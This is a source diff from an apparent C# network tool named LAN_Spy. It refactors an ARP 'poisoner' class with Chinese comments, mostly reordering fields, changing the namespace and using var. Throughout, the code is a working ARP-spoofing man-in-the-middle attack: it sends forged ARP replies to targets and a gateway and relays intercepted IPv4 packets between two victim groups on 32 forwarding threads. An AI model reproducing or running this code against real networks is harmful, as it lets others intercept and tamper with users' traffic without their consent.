@@ -1,25 +1,25 @@
-﻿using PacketDotNet;
-using PacketDotNet.Utils;
-using SharpPcap;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Net;
 using System.Threading;
+using PacketDotNet;
+using PacketDotNet.Utils;
+using SharpPcap;
 
-namespace LAN_Spy {
+namespace LAN_Spy.Model {
     /// <summary>
     ///     ARP毒化器。
     /// </summary>
     public class Poisoner : BasicClass {
         /// <summary>
-        ///     毒化目标。
+        ///     毒化线程句柄
         /// </summary>
-        public List<Host> Target1 = new List<Host>(), Target2 = new List<Host>();
-        
+        private readonly List<Thread> _poisonThreads = new List<Thread>();
+
         /// <summary>
-        ///     默认网关。
+        ///     包转发线程句柄
         /// </summary>
-        public Host Gateway = null;
+        private readonly List<Thread> _retransmissionThreads = new List<Thread>();
 
         /// <summary>
         ///     使用设备缓存。
@@ -27,27 +27,27 @@ namespace LAN_Spy {
         private ICaptureDevice _device;
 
         /// <summary>
-        ///     毒化目标缓存。
-        /// </summary>
-        private List<Host> _target1, _target2;
-
-        /// <summary>
         ///     默认网关缓存。
         /// </summary>
         private Host _gateway;
 
         /// <summary>
-        ///     毒化线程句柄
+        ///     毒化目标缓存。
         /// </summary>
-        private readonly List<Thread> _poisonThreads = new List<Thread>();
-        
-        /// <summary>
-        ///     包转发线程句柄
-        /// </summary>
-        private readonly List<Thread> _retransmissionThreads = new List<Thread>();
+        private List<Host> _target1, _target2;
 
         /// <summary>
-        ///     根据设定的 <see cref="List{T}"/> 类型的目标列表进行ARP毒化中间人攻击。
+        ///     默认网关。
+        /// </summary>
+        public Host Gateway = null;
+
+        /// <summary>
+        ///     毒化目标。
+        /// </summary>
+        public List<Host> Target1 = new List<Host>(), Target2 = new List<Host>();
+
+        /// <summary>
+        ///     根据设定的 <see cref="List{T}" /> 类型的目标列表进行ARP毒化中间人攻击。
         /// </summary>
         /// <exception cref="InvalidOperationException">已有一项毒化工作正在进行。</exception>
         /// <exception cref="NullReferenceException">未设置默认网关。</exception>
@@ -55,7 +55,7 @@ namespace LAN_Spy {
             // 判断是否有未停止的毒化工作
             if (_poisonThreads.Count > 0)
                 throw new InvalidOperationException("已有一项毒化工作正在进行。");
-            
+
             // 深复制以缓存目标
             _target1 = new List<Host>();
             _target2 = new List<Host>();
@@ -63,7 +63,7 @@ namespace LAN_Spy {
                 _target1.Add(new Host(target.IPAddress, target.PhysicalAddress));
             foreach (var target in Target2)
                 _target2.Add(new Host(target.IPAddress, target.PhysicalAddress));
-            
+
             // 缓存网关
             _gateway = Gateway ?? throw new NullReferenceException("未设置默认网关。");
 
@@ -74,22 +74,22 @@ namespace LAN_Spy {
                 _device.Filter = "arp or ip";
                 _device.StartCapture();
             }
-            
+
             // 创建包转发线程
-            for (int i = 0; i < 32; i++) {
-                Thread retransmissionThread = new Thread(RetransmissionThread);
+            for (var i = 0; i < 32; i++) {
+                var retransmissionThread = new Thread(RetransmissionThread);
                 retransmissionThread.Start();
                 _retransmissionThreads.Add(retransmissionThread);
             }
 
             // 开始毒化
             foreach (var target in _target1) {
-                Thread poisonThread = new Thread(PoisonThread);
+                var poisonThread = new Thread(PoisonThread);
                 poisonThread.Start(target);
                 _poisonThreads.Add(poisonThread);
             }
             foreach (var target in _target2) {
-                Thread poisonThread = new Thread(PoisonThread);
+                var poisonThread = new Thread(PoisonThread);
                 poisonThread.Start(target);
                 _poisonThreads.Add(poisonThread);
             }
@@ -107,10 +107,10 @@ namespace LAN_Spy {
             var targets = _target1.Contains(host) ? _target2.AsReadOnly() : _target1.AsReadOnly();
 
             // 构建包信息
-            EthernetPacket ether = new EthernetPacket(_device.MacAddress,
+            var ether = new EthernetPacket(_device.MacAddress,
                 host.PhysicalAddress,
                 EthernetPacketType.Arp);
-            ARPPacket arp = new ARPPacket(ARPOperation.Response,
+            var arp = new ARPPacket(ARPOperation.Response,
                 host.PhysicalAddress,
                 host.IPAddress,
                 _device.MacAddress,
@@ -123,7 +123,7 @@ namespace LAN_Spy {
 
             try {
                 // 强毒化
-                for (int i = 0; i < 20; i++) {
+                for (var i = 0; i < 20; i++) {
                     foreach (var target in targets) {
                         arp.SenderProtocolAddress = target.IPAddress;
                         arp.UpdateCalculatedValues();
@@ -149,7 +149,7 @@ namespace LAN_Spy {
                     arp.SenderProtocolAddress = target.IPAddress;
                     arp.SenderHardwareAddress = target.PhysicalAddress;
                     arp.UpdateCalculatedValues();
-                    for (int i = 0; i < 5; i++)
+                    for (var i = 0; i < 5; i++)
                         _device.SendPacket(ether);
                 }
             }
@@ -165,21 +165,21 @@ namespace LAN_Spy {
                     RawCapture packet;
                     if ((packet = NextRawCapture) != null) {
                         // 分析数据包中的数据
-                        EthernetPacket ether = new EthernetPacket(new ByteArraySegment(packet.Data));
+                        var ether = new EthernetPacket(new ByteArraySegment(packet.Data));
 
                         // 由本机发出的数据包，忽略
-                        if (ether.SourceHwAddress.ToString().Equals( _device.MacAddress.ToString())) continue;
+                        if (ether.SourceHwAddress.ToString().Equals(_device.MacAddress.ToString())) continue;
 
                         if (ether.Type == EthernetPacketType.IpV4) {
                             // 解析IPv4包
-                            IPv4Packet ipv4Packet = (IPv4Packet) ether.PayloadPacket;
+                            var ipv4Packet = (IPv4Packet) ether.PayloadPacket;
 
                             // 检查数据包源和目的是否在目标列表中
                             Host src = _target1.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.SourceAddress.ToString())) ??
                                        _target2.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.SourceAddress.ToString())),
                                 dest = _target1.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString())) ??
                                        _target2.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString()));
-                            
+
                             // 两组间发送的数据包
                             if (_target1.Contains(src) && _target2.Contains(dest) ||
                                 _target2.Contains(src) && _target1.Contains(dest))
@@ -193,14 +193,14 @@ namespace LAN_Spy {
                             // 不需要转发数据包
                             else
                                 continue;
-                            
+
                             // 转发数据包到指定目标
                             ether.SourceHwAddress = _device.MacAddress;
                             _device.SendPacket(ether);
                         }
                         else if (ether.Type == EthernetPacketType.Arp) {
                             // 解析ARP包
-                            ARPPacket arp = (ARPPacket) ether.PayloadPacket;
+                            var arp = (ARPPacket) ether.PayloadPacket;
 
                             // 仅处理ARP请求包
                             if (arp.Operation != ARPOperation.Request) continue;
@@ -210,16 +210,16 @@ namespace LAN_Spy {
                                        _target2.Find(item => item.IPAddress.ToString().Equals(arp.SenderProtocolAddress.ToString())),
                                 dest = _target1.Find(item => item.IPAddress.ToString().Equals(arp.TargetProtocolAddress.ToString())) ??
                                        _target2.Find(item => item.IPAddress.ToString().Equals(arp.TargetProtocolAddress.ToString()));
-                            
+
                             // 非两组间发送的数据包，跳过
                             if ((!_target1.Contains(src) || !_target2.Contains(dest)) &&
                                 (!_target2.Contains(src) || !_target1.Contains(dest))) continue;
 
                             // 构建包信息
-                            EthernetPacket e = new EthernetPacket(_device.MacAddress,
+                            var e = new EthernetPacket(_device.MacAddress,
                                 arp.SenderHardwareAddress,
                                 EthernetPacketType.Arp);
-                            ARPPacket a = new ARPPacket(ARPOperation.Response,
+                            var a = new ARPPacket(ARPOperation.Response,
                                 arp.SenderHardwareAddress,
                                 arp.SenderProtocolAddress,
                                 _device.MacAddress,
@@ -233,12 +233,14 @@ namespace LAN_Spy {
                             // 发送响应包到指定目标
                             _device.SendPacket(e);
                         }
-                    } else {
+                    }
+                    else {
                         // 队列尚未获得数据，挂起等待
                         Thread.Sleep(100);
                     }
                 }
-            } catch (ThreadAbortException) { }
+            }
+            catch (ThreadAbortException) { }
         }
 
         /// <summary>
@@ -253,9 +255,9 @@ namespace LAN_Spy {
             foreach (var poisonThread in _poisonThreads)
                 if (poisonThread.IsAlive)
                     poisonThread.Abort();
-            
+
             // 等待毒化线程终止
-            int waitTime = 60 * 1000;
+            var waitTime = 60 * 1000;
             while (waitTime >= 0) {
                 waitTime = -waitTime;
                 foreach (var poisonThread in _poisonThreads)
@@ -272,7 +274,7 @@ namespace LAN_Spy {
             foreach (var retransmissionThread in _retransmissionThreads)
                 if (retransmissionThread.IsAlive)
                     retransmissionThread.Abort();
-            
+
             // 等待包转发线程终止
             waitTime = 60 * 1000;
             while (waitTime >= 0) {
@@ -286,7 +288,7 @@ namespace LAN_Spy {
                     }
             }
             _retransmissionThreads.Clear();
-            
+
             // 关闭设备
             if (!(_device = DeviceList[CurDevIndex]).Started) return;
             _device.OnPacketArrival -= Device_OnPacketArrival;
